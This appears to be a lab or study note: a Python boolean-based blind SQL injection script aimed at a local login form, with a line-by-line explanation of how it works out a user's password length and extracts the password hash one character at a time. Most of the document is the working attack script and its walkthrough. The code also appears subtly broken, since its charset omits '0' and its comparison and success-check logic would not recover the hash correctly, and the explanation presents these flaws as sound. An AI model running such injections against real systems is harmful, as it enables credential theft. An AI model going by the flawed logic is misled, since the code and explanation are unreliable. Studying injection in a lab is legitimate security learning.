```python
import requests

# Global variable to track the number of queries made
total_queries = 0

# The charset used to guess the password hash characters
charset = "123456789abcdef"

# The target URL for the SQL injection attack
target = "http://127.0.0.1:5000"

# The string to look for in the response to determine if the injection was successful
needle = "Welcome back"

# Function to perform the SQL injection query
def injected_query(payload):
    global total_queries
    # Send a POST request with the injected SQL payload
    r = requests.post(target, data={"username": "admin {}--".format(payload), "password": "password"})
    total_queries += 1
    # Check if the response does not contain the needle, indicating success
    return needle.encode() not in r.content

# Function to perform a boolean-based SQL injection to compare a specific character
def boolean_query(offset, user_id, character, operator=">"):
    # SQL payload to check if the character at the given offset is greater than the given character
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if a user ID is invalid
def invalid_user(user_id):
    # SQL payload to check if the user ID exists
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to determine the length of the password for a given user ID
def password_length(user_id):
    i = 0
    while True:
        i += 1
        # SQL payload to determine if the password length is less than or equal to the current value of i
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        # If the query returns false, we've found the password length
        if not injected_query(payload):
            return i

# Function to extract the password hash character by character
def extract_hash(charset, user_id, password_length):
    found = ""
    # Iterate over each character position in the password
    for i in range(0, password_length):
        # Iterate over each character in the charset to find the correct one
        for j in range(len(charset)):
            # Use boolean_query to determine if the current character is correct
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]  # Add the correct character to the found password hash
                break
    return found

# Function to print the total number of queries made
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

# Main loop to interactively extract password hashes
while True:
    try:
        # Ask the user for a user ID to target
        user_id = input("> Enter a user ID to extract the password hash: ")
        # Check if the user ID is valid
        if invalid_user(user_id):
            print("\t[X] User {} does not exist!".format(user_id))
        else:
            # Determine the password length for the given user ID
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            # Extract the password hash for the given user ID
            password_hash = extract_hash(charset, user_id, user_password_length)
            print("\t[-] User {} password hash: {}".format(user_id, password_hash))
            total_queries_taken()
    except KeyboardInterrupt:
        # Handle Ctrl+C to exit the program
        print("\n[!] Exiting...")
        break

```


Let's walk through the script step by step with detailed explanations:

### 1. **Imports and Global Variables**
```python
import requests

total_queries = 0
charset = "123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"
```
- **`import requests`**: This imports the `requests` library, which is used for sending HTTP requests to the target server.
- **`total_queries`**: This variable keeps track of the total number of SQL queries sent. It starts at `0`.
- **`charset`**: This is the set of characters (`"123456789abcdef"`) that the script will use to guess the password hash. It's a subset of hex characters.
- **`target`**: This is the URL of the web application that is vulnerable to SQL injection. The script will send requests to this URL.
- **`needle`**: This string represents a successful login message. If the message does not appear in the response, it suggests that the SQL injection was successful.

### 2. **Injected Query Function**
```python
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content
```
- **`def injected_query(payload):`**: This function takes a `payload` string, which contains the SQL injection query.
- **`global total_queries`**: This statement allows the function to modify the global `total_queries` variable.
- **`requests.post(target, data=...)`**: This sends a POST request to the `target` URL with the injected SQL query embedded in the `username` field. The password is hardcoded as `"password"`.
- **`total_queries += 1`**: Every time this function is called, the total number of queries is incremented by 1.
- **`return needle.encode() not in r.content`**: The function checks if the `needle` string is absent in the response content. If itâ€™s absent, it indicates that the SQL injection was successful.

### 3. **Boolean Query Function**
```python
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)
```
- **`def boolean_query(offset, user_id, character, operator=">"):`**: This function generates a SQL query to compare a specific character in the password hash against a given character.
- **`payload = ...`**: The payload is a SQL query that checks if the `offset`-th character of the password (converted to hexadecimal) is greater than (`>`) the given `character`.
  - **`substr(password,{},1)`**: This extracts a single character from the password at the position `offset + 1`.
  - **`hex('{}')`**: Converts the character to its hexadecimal representation.
  - **`operator=">"`**: The operator can be changed to test for equality or other comparisons.
- **`return injected_query(payload)`**: The function sends the SQL payload using `injected_query` and returns whether the query was successful.

### 4. **Invalid User Function**
```python
def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)
```
- **`def invalid_user(user_id):`**: This function checks if the provided `user_id` exists in the database.
- **`payload = ...`**: The payload is a SQL query that selects the `id` from the `user` table where `id` matches the provided `user_id`. If the user exists, the query should return a valid result.
- **`return injected_query(payload)`**: This sends the query and checks if the user ID is valid.

### 5. **Password Length Function**
```python
def password_length(user_id):
    i = 0
    while True:
        i += 1
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
```
- **`def password_length(user_id):`**: This function determines the length of the password for a specific `user_id`.
- **`i = 0`**: The variable `i` is initialized to `0`. It will be used to incrementally check the password length.
- **`while True:`**: This loop continues until the correct password length is found.
  - **`i += 1`**: Increment `i` to test the next possible length.
  - **`payload = ...`**: The payload checks if the length of the password is less than or equal to `i`.
  - **`if not injected_query(payload):`**: If the query returns false, it means the length of the password is greater than `i`. Therefore, the function returns the correct length `i`.

### 6. **Extract Hash Function**
```python
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found
```
- **`def extract_hash(charset, user_id, password_length):`**: This function extracts the password hash character by character.
- **`found = ""`**: This variable will store the extracted password hash.
- **`for i in range(0, password_length):`**: Loop over each character position in the password from `0` to `password_length - 1`.
  - **`for j in range(len(charset)):`**: For each character position, loop through the `charset` to find the correct character.
    - **`if boolean_query(i, user_id, charset[j]):`**: Use `boolean_query` to check if the `j`-th character of the `charset` is the correct one for the `i`-th position.
    - **`found += charset[j]`**: If the character is correct, add it to the `found` string.
    - **`break`**: Exit the loop once the correct character is found for this position.
- **`return found`**: The function returns the fully extracted password hash.

### 7. **Total Queries Function**
```python
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0
```
- **`def total_queries_taken():`**: This function prints the total number of SQL queries that were executed.
- **`global total_queries`**: Access the global `total_queries` variable.
- **`print("\t\t[!] {} total queries!".format(total_queries))`**: Print the total number of queries.
- **`total_queries = 0`**: Reset the counter for the next extraction.

### 8. **Main Execution Loop**
```python
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if invalid_user(user_id):
            print("\t[X] User {} does not exist!".format(user_id))
        else:
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            password_hash = extract_hash(charset, user_id, user_password_length)
            print("\t[-] User {} password hash: {}".format(user_id, password_hash))
            total_queries_taken()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        break
```
- **`while True:`**: Start an infinite loop to continuously allow the user to extract password hashes.
- **`user_id = input("> Enter a user ID to extract the password hash: ")`**: Prompt the user to enter a `user_id`.
- **`if invalid_user(user_id):`**: Check if the `user_id` is invalid.
  - **`print("\t[X] User {} does not exist!".format(user_id))`**: If the user does not exist, print an error message.
- **`else:`**: If the user exists:
  - **`user_password_length = password_length(user_id)`**: Determine the length of the password for the given `user_id`.
  - **`print("\t[-] User {} hash length: {}".format(user_id, user_password_length))`**: Print the length of the password hash.
  - **`total_queries_taken()`**: Print the total number of queries made to determine the length.
  - **`password_hash = extract_hash(charset, user_id, user_password_length)`**: Extract the full password hash.
  - **`print("\t[-] User {} password hash: {}".format(user_id, password_hash))`**: Print the extracted password hash.
  - **`total_queries_taken()`**: Print the total number of queries made to extract the hash.
- **`except KeyboardInterrupt:`**: If the user presses `Ctrl+C`, handle the interruption.
  - **`print("\n[!] Exiting...")`**: Print a message indicating the script is exiting.
  - **`break`: Exit the infinite loop and terminate the program.**



This script is a demonstration of a boolean-based blind SQL injection technique. It automates the process of extracting data (in this case, a password hash) from a vulnerable web application by systematically querying the database character by character.


# Output
![[Pasted image 20240815205730.png]]

